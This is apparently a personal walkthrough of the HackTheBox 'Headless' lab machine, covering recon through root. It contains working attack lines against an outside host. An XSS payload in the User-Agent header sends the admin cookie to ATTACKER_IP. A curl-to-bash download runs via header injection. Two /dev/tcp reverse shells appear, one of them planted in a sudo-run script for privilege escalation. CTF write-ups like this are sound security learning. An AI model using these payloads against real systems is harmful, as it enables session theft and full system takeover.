# Headless
<br/>

## Intro
Welcome to the Headless challenge by HackTheBox. <br>
Link to the challenge [HERE](https://app.hackthebox.com/machines/Headless)

In this room we are gonna have some fun with web-exploitation and Linux privilege escalation in order to find the user and root flags. 

Whenever you feel ready start the instance and connect via OpenVPN.

Let's begin!

<br/>
<br/>

## The Challenge
I started by doing an *nmap* scan of the domain
```bash
nmap -Sv IP
```
and it tells us that port 22(ssh) and 5000 are open.

From the information we know so far my idea is that we have to find some clues in the webserver, maybe the ssh credentials to than connect to the machine and escalate our privileges.

On the second port is running a web server of some kind, so i have  opened my web browser and inserted: MACHINE-IP:5000
Once i got this result i also started a directory search against the website
```bash
sudo gobuster dir -u http://MACHINE-IP:5000/ -w /usr/share/wordlists/dirb/common.txt
```
this gave me 2 results: /dashboard and /support.
Let' start visiting the IP:5000/dashboard page, we get an error "Internal Server error", i think that's because as a dashboard page we probably have to be logged in. <br>

I inspected the page and didn't find any useful info, so i went for the browser dev tools, looking for more hints and i have found that there is a cookie called `is_admin` with the value: `InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs`.
I pasted the value into a string decoder and the first part before the dot translate to: "user" from base 64.

This means that to access the dashboard we probably need another level of authorization, something like the admin cookie.
Leave it here, as it will be useful later.

Now is time to check the /support page.

Clicking the contact support button we enter a new page with a form we can compile with our personal data, there is a also a section where we can insert a message.
Maybe through that message box we can inject some code?
I started trying the most simple one:
```
<script>alert("hello")</script>
```
Injecting this script who view the message should get an alert box, but when i sent it it told me that an hacking attempt was found.

I decided to open Burp Suite and try again but with the proxy enabled to see if i could find any more information.

Capture the request, sent it to repeater, now here we can start testing the different headers and find which one is vulnerable.
We also know that if the request get succesfully sent we get no feedback message, so to verify it we have to find a way to make it communicate with us.

We can achieve it by creating a simple server with python on our machine and craft a script to call for that server.
```bash
python3 -m http.server 8001
```

After other tests i was always getting the message "hacking detected" even encoding my payload in the message, so i started trying to inject it in other fields and found that the user-agent one was vulnerable.

Now we need to craft the payload and exploit the XSS vulerability, this means that when the message is received and viewed it will trigger our code.
I have chosen this one  because it will try to load an image from the source x which doesn't exists, than `onerror` tells what to do if an error occurs, and is to go and fetch something from our own webserver, and espose the admin cookie value.

```html
<img src=x onerror=fetch('http://ATTACKER_IP:8001/?c='+document.cookie);>
```

This is the full burp request i have sent:
```
POST /support HTTP/1.1
Host: MACHINE-IP:5000
Content-Length: 138
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://MACHINE-IP:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <img src=x onerror=fetch('http://ATTACKER_IP:8001/?c='+document.cookie);>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://MACHINE-IP:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: close

fname=test&lname=test&email=test%40test&phone=123456789&message=<img src=x onerror=fetch('http://ATTACKER_IP:8001/?c='+document.cookie);>
```
Press send and after about a minute we should get on our terminal the Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

Now we can finally access the dashboard, navigate again to that page, open the dev tools and change the cookie value with the one we just got, than reload the page.

Let's start again the Burp proxy and try to click on the "Generate Report" button to capture the request.
At first sight seems nothing useful, even forwarding the request we do not get any interesting info or exposed data, this made me think that probably we have to inject code again, and as this time we have admins rights maybe we can get a shell.

Specifically the idea is to create a payload for a reverse shell on our machine.
So let's start by setting up the listener with netcat
```bash
nc -lvnp 1234
```

Back on Burp
I started by testing the Date header with this payload: (You can use [this websire](https://www.revshells.com/) to generate reverse shells payloads )
```bash
sh -i >& /dev/tcp/ATTACKER_IP/1234 0>&1
```
Unfortunately it does not get executed... thinking about the first part of the challenge where we were calling for a file i tough about doing the same here, creating a file containing the shell and than setting up a python server, retrieve that file and execute the shell inside.

Create the shell file
```bash
nano shell.sh
```
paste inside the shell above

Now from the folder where is the shell file located
```bash
python3 -m http.server 8001
```

Now in the line that contains the Date header in burp repeater, we can put `;` after the actual data value to  close that statement and than add a call to our file, finally we can pipe it into bash to execute it
```bash
curl http://ATTACKER_IP:8001/shell.sh | bash
```

You should get in a few seconds a shell into your listener.

Now we can start to explore:
```bash
whoami
```
```bash
pwd
```

Let's go to this user home directory and see what's inside
```bash
cd ..
```
```bash
ls
```

Something look interesting, there is a text file called user:
```bash
cat user.txt
```
And we got our first flag:
--> REDACTED
<br/>

## Admin Flag
Now is time do do some Privilege Escalation to become admin and get final flag.

We can start by understanding what we can run as sudo
```bash
sudo -l
```

A binary called *syscheck* pops out:
```
User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

Let's check what is it
```bash
cat /usr/bin/syscheck
```
Here is the code
```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

By analyzing it looks like that in the last if statement it is starting a script file called initdb.sh, let's check it's permissions, if we can modify it we can write some code to get to root.

Running the command *find* i was able to locate it inside the tmp folder
```bash
cd /tmp
```
```bash
ls -la
```
Looks like the file is owned by our user

We can modify it my including another web shell, execute it with admin rights and have a shell as root
```bash
echo "sh -i >& /dev/tcp/ATTACKER_IP/12345 0>&1" > initdb.sh
```

Create another listener on your machine (remember to chose a different port this time)
```bash
nc -lvnp 12345
```

Now we can run the script file
```bash
sudo /usr/bin/syscheck
```

And in a couple of second we have again another shell, if we run the `whoami` command we see that we are root.
Navigate to the root directory and open the final flag
```bash
cd /root
```
```bash
cat /root.txt
```

<br>

Congratulations, you have completed the Headless challenge, i had a lot of fun doing it hope you did as well. <br>
If you wanna see more write ups you can check the WriteUps Directory in this GitHub repo. <br>
Catch you in the next CTF 😃 <br>
